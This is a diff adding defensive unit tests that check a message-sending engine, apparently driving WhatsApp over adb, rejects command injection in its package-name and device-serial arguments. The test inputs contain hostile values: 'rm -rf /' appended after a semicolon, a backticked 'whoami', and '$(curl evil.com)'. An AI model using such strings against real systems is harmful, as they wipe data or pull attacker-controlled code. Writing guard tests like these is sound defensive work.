@@ -240,6 +240,45 @@ describe('SendEngine', () => {
     })
   })
 
+  describe('injection guards', () => {
+    it('rejects unknown app packages', async () => {
+      const msg = enqueueMsg('guard-1')
+      await expect(engine.send(msg, 'device-1', true, 'com.evil.app')).rejects.toThrow('Rejected app package')
+    })
+
+    it('rejects shell metacharacters in app package', async () => {
+      const msg = enqueueMsg('guard-2')
+      await expect(engine.send(msg, 'device-1', true, 'com.whatsapp;rm -rf /')).rejects.toThrow('Rejected app package')
+    })
+
+    it('rejects unsafe device serial', async () => {
+      const msg = enqueueMsg('guard-3')
+      await expect(engine.send(msg, 'device;rm -rf /', true)).rejects.toThrow('Rejected device serial')
+    })
+
+    it('rejects backtick injection in device serial', async () => {
+      const msg = enqueueMsg('guard-4')
+      await expect(engine.send(msg, '`whoami`', true)).rejects.toThrow('Rejected device serial')
+    })
+
+    it('rejects $() subshell in device serial', async () => {
+      const msg = enqueueMsg('guard-5')
+      await expect(engine.send(msg, '$(curl evil.com)', true)).rejects.toThrow('Rejected device serial')
+    })
+
+    it('allows valid com.whatsapp package', async () => {
+      const msg = enqueueMsg('guard-6')
+      stubShellForSend(mockAdb)
+      await expect(engine.send(msg, 'device-1', true, 'com.whatsapp')).resolves.toBeDefined()
+    })
+
+    it('allows valid com.whatsapp.w4b package', async () => {
+      const msg = enqueueMsg('guard-7')
+      stubShellForSend(mockAdb)
+      await expect(engine.send(msg, 'device-1', true, 'com.whatsapp.w4b')).resolves.toBeDefined()
+    })
+  })
+
   describe('pre-send health check', () => {
     it('always sends KEYCODE_WAKEUP proactively', async () => {
       const msg = enqueueMsg('health-1')
